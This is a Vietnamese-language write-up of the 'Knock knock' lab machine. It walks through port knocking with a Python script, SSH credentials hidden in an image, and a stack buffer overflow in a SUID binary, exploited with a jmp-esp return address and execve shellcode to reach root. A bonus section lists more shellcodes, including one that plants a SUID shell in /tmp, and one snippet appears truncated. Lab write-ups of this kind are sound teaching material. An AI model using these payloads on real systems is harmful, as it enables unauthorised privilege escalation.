# Knock knock

Bước đầu tiên cũng là scan xem địa chỉ IP của máy này là bao nhiêu, lúc này mình dùng nmap và biết dải mạng là 192.168.113.0/24 ⇒ Sử dụng

```python
nmap -sn -T5 192.168.113.0/24
```

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled.png)

Kết quả có 2 địa chỉ, và 192.168,113.139 là máy knock của mình vì 192.168.113.133 là địa chỉ IP của một con máy ảo mình dùng để compile source code c.

Tiếp tục là dùng `rustscan` để scan port

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%201.png)

Có 1 port mở là 1337 nhưng scan tiếp dịch vụ thì lại không có gì. Đây chính là kỹ thuật port knocking để giấu đi các port.

Khi mình thực hiện netcat tới port này thì sẽ có 3 port trả về

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%202.png)

Có thể là sẽ phải liên tục nc tới IP này cộng với 3 port kia cho nên mình sử dụng script sau

```python
import socket
import sys
import itertools

des = "192.168.113.139" # change IP

def return_port(raw):
    if len(raw) < 0:
        return None
    
    raw = raw.decode("utf-8")
    raw = raw.replace('[', '')
    raw = raw.replace(']', '')
    raw_list = raw.split(',')
    
    ports=[]
    for i in raw_list:
        ports.append(int(i))
        
    return ports

def get_port():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((des, 1337))
    except Exception as ex:
        sys.exit()
        
    raw_list = sock.recv(24)
    
    ports = return_port(raw_list)
    
    # Sau khi lấy được port trả về, sẽ kết nối với từng port đó
    for i in itertools.permutations(ports):
        for j in i:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            print(j)
            sock.connect_ex((des, j))
            sock.close()
    
def main():
    get_port()
    

if __name__=='__main__':
    main()
```

Script này nó sẽ mở kết nối socket tới địa chỉ 192.168.113.139 với các port được trả về đó đến khi nào các port này đóng thì thôi

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%203.png)

Sau khi chạy xong thì mình scan lại và sẽ có kết quả

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%204.png)

Truy cập vào web sẽ có giao diện như sau

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%205.png)

Sử dụng dirsearch để tìm các directory, file khác nhưng không tìm được gì

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%206.png)

Tải file ảnh ở giao diện đó về

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%207.png)

Sử dụng `exiftool` để kiểm tra xem có gì đặc biệt không nhưng không có gì cả

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%208.png)

Sử dụng `strings` để đọc xem file ảnh có giấu gì không

```bash
strings knockknock.jpg
```

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%209.png)

Thông tin này có thể là dùng để login qua ssh nhưng mà đang bị sai. Cần decode nó lại, mang lên CyberChef để check nhưng không thu được gì, tiếp tục sử dụng [dcode.fr](http://dcode.fr) để check

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2010.png)

Quan sát thấy nó bị đảo ngược ⇒ reverse lại ⇒ Jason

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2011.png)

Khả năng đúng rồi, giờ nốt cái thứ 2 nữa để xem nó là gì

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2012.png)

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2013.png)

⇒ jB9jP2knf

Giờ thì ssh vào

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2014.png)

Sau đó chạy tìm các thứ như sudo right, CVE, SUID thì chỉ thấy có cái này

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2015.png)

Vì file này là file thực thi mà nó lại không có gdb trong máy ảo này ⇒ Phải tải file này về máy khác có gdb để debug các thứ (Chạy lại file trên cùng để nó mở port 22 nhé)

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2016.png)

Câu lệnh `jason@192.168.113.139:tfc ./` là để copy file `tfc` trong thư mục gốc của người dùng `jason` lưu vào thư mục hiện tại mình đang đứng `./`

Sau khi tải về thì chạy thử

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2017.png)

Như vậy nó sẽ giống kiểu phép XOR thôi, vậy thì thử với 100000 byte xem có crash chưa

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2018.png)

WTF chưa crash luôn (Nhưng 5000 thì có nên mất rất nhiều thời gian để fuzz cái này)

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2019.png)

Sau đó mình dùng gdb để debug mà nó nhiều quá thế nên nản :)))

Bước này mình phải bật core dump lên bằng lệnh sau, lệnh này sẽ set maximum size là không giới hạn

```bash
ulimit -c unlimited
```

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2020.png)

Tiếp theo dùng tool `xxd` để chuyển nó từ dạng text ⇒ hex

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2021.png)

Tại sao ở đây lại grep với `def0` thì chúng ta cần quay lại một ví dụ như này

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2022.png)

Đây, mình đưa đầu vào là AAAA mà nó ra `def0` thì có thể def0 đó sẽ là A hoặc AA hoặc AAAA hay là cái thứ quái quỷ nào đó liên quan đến A

Cho nên là mình sẽ search theo cái đó để tìm chữ A :v

Giờ thì gdb để xem nó crash ở đâu mà lại toàn cái quái quỉ gì đó. Nguyên nhân là nó đã bị mã hóa nên file core đó cũng đã bị mã hóa rồi, giờ mình đưa cái đã mã hóa vào lại ⇒ Được giải mã ⇒ Đọc core tìm vị trí.

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2023.png)

Sử dụng câu lệnh sau để tạo 1 file a.tfc với 5000 byte, tính lấy từ block có `def0` mà mình search

```bash
dd if=core of=a.tfc skip=210384 count=5000 bs=1
```

Tại sao ở đây là 210384? thì quay lại chỗ mình search `def0`

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2024.png)

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2025.png)

Và ở đây mình hãy lưu lại cái file `xxd core` này vào đâu đi nhé, tẹo sử dụng tiếp đấy

Sau đó mình chạy file `tfc` với input là file `a.tfc`

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2026.png)

Như vậy là đã tìm ra vị trí rồi, nhưng chưa biết nó sẽ bị crash sau bao nhiêu byte thì phải làm như nào? Lúc này mình dùng `cyclic` để tạo 5000 bytes unique, sau đó tìm cái chuỗi gây crash là ở byte bao nhiêu là ra.

```bash
from pwn import *

with open('in.tfc', 'wb') as file:
    file.write(cyclic(5000))
```

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2027.png)

Với script ở trên thì cần phải cài libs pwntools, nên cài trên windows rồi download về máy ảo cho nhanh chứ cài trên máy ảo lâu lắm. Giờ tải file này về

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2028.png)

Và tiến hành chạy nó. Và thực thi hiện như nãy chạy 

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2029.png)

Tại sao lúc này grep def0 lại không tìm thấy? Nguyên nhân là trong file cyclic.tfc có phải là toàn chữ A đâu :)))

Vậy thì làm sao mà mình tìm ra được số bytes để skip khi dùng `dd` đây?

Còn nhớ chỗ mình bảo lưu lại file `xxd core` khi chạy với file 5000 chữ A không, giờ là lúc sử dụng lại nó. Bây giờ cũng lưu lại file `xxd core` của file cyclic này lại. Mình để 2 màn hình như này cho dễ so sánh

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2030.png)

Giờ thì tìm doạn `def0` trong file 1

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2031.png)

Nhìn mấy chỗ gạch chân đoạn `{Q..` bên file 1 đi, nó có giống bên file 2 không? Lại bảo không giống đi.

Có 2 cách để mình tìm thấy số byte cần thiết đó:

- Số dòng: Cách này là đơn giản nhất mà có khi nó đúng trong một vài trường hợp thôi,
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2032.png)
    
    Từ chỗ `{Q..`(`000334c0`) đến `000335d0` là 16 dòng (không tính 2 đầu) vậy thì sang bên kia cũng là 16 dòng không tính 2 đầu ⇒ Giá trị là `000335c0`, mang đi tính ta được
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2033.png)
    
- Cách thứ 2 là theo nhân diện, giờ mình sẽ chỉ tập trung vào file thứ 2 thôi nhé
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2034.png)
    
    Nó sẽ có dấu hiện bắt đầu là sau 1 khoảng null rất lớn (như phần 3 mũi tên đã chỉ). Sau đó sẽ có 1 số byte quái quỷ nào đó, mình bắt đầu fuzz từ đoạn này ⇒ Bao giờ ra đúng thì thôi
    

Sau khi mình đã tìm ra số byte cần bỏ qua rồi thì tiếp tục sử dụng `dd …` để tạo 1 file a.tfc rồi chạy ⇒ Lấy file core, gdb để tìm chỗ crash

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2035.png)

Lúc này chỉ cần tìm đoạn crash (0x61687062) trong cyclic nó ở byte bao nhiêu là được

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2036.png)

Giờ thì đã biết 4124 bytes này rồi, giờ mình thêm 4 bytes nữa thì nó sẽ ghi đè vào return address. Vậy mình sẽ cho return nó về `esp` (Vì lúc mình truyền theo shellcode, lướt lướt một đoạn thì esp này sẽ chỉ vào đúng cái đoạn shellcode đó). Khi return về esp ⇒ Thực thi shellcode

Giờ thì dùng tool `msfelfscan` để tìm chuỗi esp trong file `tfc`

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2037.png)

Có địa chỉ này rồi thì mình ghi đè vào return address cái địa chỉ 0x08048e93 là xong. Hoàn thiện payload nào

```python
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

returnAddress = "\x93\x8e\x04\x08" # 0x08048e93

print("A" * 4124 + returnAddress + shellcode)
```

Sau đó chạy và lưu vào file `pl.tfc`: `python payload.py > pl.tfc`

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2038.png)

Tiếp theo chạy một `tfc` với input là `pl.tfc`: `./tfc pl.tfc out.tfc` 

Tiếp tục là tìm `def0` (vì lần này đoạn đầu payload toàn ký tự A) ⇒ Mang đi tính số bytes cần bỏ qua

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2039.png)

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2040.png)

Giờ thì tạo file `a.tfc` thôi: `dd if=core of=a.tfc skip=210384 count=5000 bs=1`

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2041.png)

Khi ra được file `a.tfc` rồi thì làm đầu vào cho `tfc`: `./tfc a.tfc out.tfc` Và BOOOMMMMM

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2042.png)

Có shell rồi :v giờ thì đưa file này vào trong máy jason thôi. Có thể dùng 2 cách

- Cách 1, dùng scp luôn
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2043.png)
    
- Cách 2 là tải xuống, vào máy jason rồi tải về
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2044.png)
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2045.png)
    

Giờ thì chạy `tfc` đó với input là 1 trong 2 file là leo được root rồi

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2046.png)

Và giờ là lấy flag

![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2047.png)

Và xong

# BONUS

Đây cũng là một số shell có thể sử dụng

1. Shell 1

```python
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

1. Shell 2 (21 bytes)

```python
shellcode = "\xeb\x5e\x5f\x31\xc0\x88\x47\x07\x88\x47\x0f\x88\x47\x19\x89\x7f"
```

1. Create file SUID

```python
shellcode = "\x1a\x8d\x77\x08\x89\x77\x1e\x31\xf6\x8d\x77\x10\x89\x77\x22\x89"
shellcode += "\x47\x26\x89\xfb\x8d\x4f\x1a\x8d\x57\x26\x31\xc0\xb0\x02\xcd\x80"
shellcode += "\x31\xf6\x39\xc6\x75\x06\xb0\x0b\xcd\x80\xeb\x1d\x31\xd2\x31\xc0"
shellcode += "\x31\xdb\x4b\x8d\x4f\x26\xb0\x07\xcd\x80\x31\xc0\x8d\x5f\x10\x31"
shellcode += "\xc9\x66\xb9\x6d\x09\xb0\x0f\xcd\x80\x31\xc0\x40\x31\xdb\xcd\x80"
shellcode += "\xe8\x9d\xff\xff\xff/bin/cp8/bin/sh8/tmp/xxxx"
```

Shell này sẽ copy file `/bin/sh` sang `/tmp/xxxx` đồng thời cấp quyền SUID cho nó :v

Ví dụ sử dụng shell này trong bài trên

- Test trên máy
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2048.png)
    
- Chạy trên jason
    
    ![Untitled](Knock%20knock%200fd187fb6e7f4817a31d17bfc775bf0d/Untitled%2049.png)